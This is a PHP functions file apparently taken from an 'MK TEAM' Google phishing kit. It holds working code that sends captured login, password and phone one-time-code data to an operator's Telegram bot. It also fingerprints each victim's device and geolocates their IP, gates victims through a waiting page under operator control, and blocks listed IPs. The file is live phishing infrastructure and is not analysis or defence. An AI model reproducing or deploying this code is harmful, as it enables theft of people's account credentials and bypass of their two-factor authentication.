<?php
// includes/functions.php

require_once __DIR__ . '/db.php';

/**
 * Generate a URL with ?session_id=...
 */
function generatePageUrl($page, $sessionId) {
    return $page . '?session_id=' . urlencode($sessionId);
}

/**
 * Send a message to Telegram with "MK TEAM" subject + an icon for each pageName,
 * skipping if your bot token or chat ID are placeholders.
 */
function sendToTelegram($message, $pageName = '', $sessionId = '') {
    // Replace with your actual bot token + chat ID
    $botToken = "your_token"; // add your token here
    $chatId   = "your_id"; // add your chat id here

    // Skip if placeholders or empty
    if (
        $botToken === "any" ||
        $chatId   === "any"  ||
        empty($botToken) || 
        empty($chatId)
    ) {
        return;
    }

    $icon = '';
    switch ($pageName) {
        case 'login':     $icon = "\xF0\x9F\x91\xA5"; break;
        case 'password':  
        case 'wrong_password':  $icon = "\xF0\x9F\x94\x91"; break;
        case 'phone_otp': 
        case 'wrong-phone_otp': $icon = "\xF0\x9F\x93\xB1"; break;
        default:          $icon = "\xF0\x9F\x94\x92"; break;
    }

    $subject = "MK TEAM Google" . strtoupper($pageName);
    $text  = "$subject $icon [Session: $sessionId]\n";
    $text .= $message;

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text'    => $text
    ];

    @file_get_contents($url . "?" . http_build_query($params));
}



/**
 * Get basic device information from the user agent.
 */
function getDeviceInfo($userAgent) {
    $device = "Unknown Device";
    $browser = "Unknown Browser";
    
    // Check for iOS devices before Mac OS X because iOS Safari often includes "Mac OS X" in its UA.
    if (stripos($userAgent, "iPhone") !== false) {
         $device = "iPhone";
    } elseif (stripos($userAgent, "iPad") !== false) {
         $device = "iPad";
    } elseif (stripos($userAgent, "Android") !== false) {
         $device = "Android";
    } elseif (stripos($userAgent, "Windows") !== false) {
         if (preg_match('/Windows NT 10.0/', $userAgent)) {
            $device = "Windows 10";
         } elseif (preg_match('/Windows NT 6.3/', $userAgent)) {
            $device = "Windows 8.1";
         } elseif (preg_match('/Windows NT 6.2/', $userAgent)) {
            $device = "Windows 8";
         } elseif (preg_match('/Windows NT 6.1/', $userAgent)) {
            $device = "Windows 7";
         } else {
            $device = "Windows";
         }
    } elseif (stripos($userAgent, "Mac OS X") !== false) {
         $device = "Mac OS X";
    } elseif (stripos($userAgent, "Linux") !== false) {
         $device = "Linux";
    }
    
    // Detect browser
    if (stripos($userAgent, "Chrome") !== false) {
         $browser = "Chrome";
    } elseif (stripos($userAgent, "Firefox") !== false) {
         $browser = "Firefox";
    } elseif (stripos($userAgent, "Safari") !== false && stripos($userAgent, "Chrome") === false) {
         $browser = "Safari";
    } elseif (stripos($userAgent, "MSIE") !== false || stripos($userAgent, "Trident") !== false) {
         $browser = "Internet Explorer";
    }
    
    return $device . "::" . $browser;
}

/**
 * Get geolocation info from IP using ip-api.com.
 */
function getGeoLocation($ip) {
    $json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=city,country");
    if ($json) {
       $data = json_decode($json, true);
       if (!empty($data['city']) && !empty($data['country'])) {
           return $data['city'] . "::" . $data['country'];
       }
    }
    return "Unknown::Unknown";
}




/**
 * OPTIONAL: Prevent user from going back in the flow
 */
function enforceSessionStep($sess, $expectedStatus) {
    if (!$sess) return;
    $currentStatus = $sess['status'] ?? '';
    if ($currentStatus !== $expectedStatus) {
        header('Location: ' . generatePageUrl('waiting.php', $sess['session_id']));
        exit;
    }
}



function checkBlockedIP() {
    $blockedFile = __DIR__ . '/../blocked_ips.json';
    if (file_exists($blockedFile)) {
        $blocked = json_decode(file_get_contents($blockedFile), true);
        if (is_array($blocked)) {
            // Adjust IP detection if behind a proxy:
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? ($_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN'));
            if (in_array($ip, $blocked)) {
                echo "<h1>Your IP ($ip) is blocked.</h1>";
                exit;
            }
        }
    }
}


